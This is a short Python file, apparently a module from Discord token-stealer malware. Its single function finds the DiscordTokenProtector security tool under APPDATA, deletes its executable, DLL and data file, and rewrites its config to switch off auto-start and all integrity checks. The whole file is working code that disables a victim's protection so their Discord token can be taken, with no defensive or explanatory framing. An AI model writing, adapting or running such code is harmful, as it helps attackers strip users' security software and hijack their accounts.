import json
import os

def killprotector():
	roaming = os.getenv('APPDATA')
	path = f"{roaming}\\DiscordTokenProtector"
	config = path + "config.json"

	if not os.path.exists(path):
		return

	for process in ["\\DiscordTokenProtector.exe", "\\ProtectionPayload.dll", "\\secure.dat"]:
		try:
			os.remove(path + process)
		except FileNotFoundError:
			pass

	if os.path.exists(config):
		with open(config, errors="ignore") as f:
			try:
				item = json.load(f)
			except json.decoder.JSONDecodeError:
				return
			item['auto_start'] = False
			item['auto_start_discord'] = False
			item['integrity'] = False
			item['integrity_allowbetterdiscord'] = False
			item['integrity_checkexecutable'] = False
			item['integrity_checkhash'] = False
			item['integrity_checkmodule'] = False
			item['integrity_checkscripts'] = False
			item['integrity_checkresource'] = False
			item['integrity_redownloadhashes'] = False
			item['iterations_iv'] = 364
			item['iterations_key'] = 457
			item['version'] = 69420

		with open(config, 'w') as f:
			json.dump(item, f, indent=2, sort_keys=True)